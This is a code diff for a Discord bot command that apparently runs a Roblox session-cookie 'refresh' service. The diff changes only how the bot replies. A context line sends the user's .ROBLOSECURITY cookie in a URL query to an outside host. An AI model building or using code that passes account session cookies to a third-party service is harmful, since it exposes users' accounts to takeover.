@@ -2311,9 +2311,6 @@ client.on('interactionCreate', async interaction => {
       cookie = cookie.substring(warningPrefix.length);
     }
 
-    // Defer the reply to allow processing time
-    await interaction.deferReply();
-
     try {
       const res = await fetch(`https://cookie-fresh.vercel.app/api/refresh?cookie=${encodeURIComponent(cookie)}`);
       const data = await res.json();
@@ -2328,10 +2325,16 @@ client.on('interactionCreate', async interaction => {
             iconURL: interaction.user.displayAvatarURL()
           });
 
-        return interaction.editReply({ embeds: [errorEmbed] });
+        return interaction.reply({ embeds: [errorEmbed], ephemeral: true });
       }
 
       const refreshed = data.redemptionResult.refreshedCookie;
+
+      // Send ephemeral confirmation first
+      await interaction.reply({
+        content: '<:yes:1393890949960306719> Cookie refresh service completed successfully! Your new cookie has been generated and sent privately.',
+        ephemeral: true
+      });
 
       // Get Roblox user data for the public embed
       const robloxData = await getRobloxUserData(cookie);
@@ -2371,16 +2374,15 @@ client.on('interactionCreate', async interaction => {
       );
       }
 
-
       publicEmbed.addFields(
         { name: "<:refresh:1397203318060880065> Refresh Result", value: "Your new cookie has been generated and sent privately.", inline: false },
         { name: "Status", value: "<:yes:1393890949960306719> Completed", inline: true }
       );
 
-      // Send the public embed as the main reply
-      await interaction.editReply({ embeds: [publicEmbed] });
+      // Send the public embed as a follow-up
+      await interaction.followUp({ embeds: [publicEmbed] });
 
-      // Send the private cookie as a follow-up
+      // Send the private cookie as another follow-up
       const privateEmbed = new EmbedBuilder()
         .setColor(0x2C2F33)
         .setTitle("Your New .ROBLOSECURITY Cookie")
@@ -2410,7 +2412,7 @@ client.on('interactionCreate', async interaction => {
           iconURL: interaction.user.displayAvatarURL()
         });
 
-      await interaction.editReply({ embeds: [embed] });
+      await interaction.reply({ embeds: [embed], ephemeral: true });
     }
   }
 
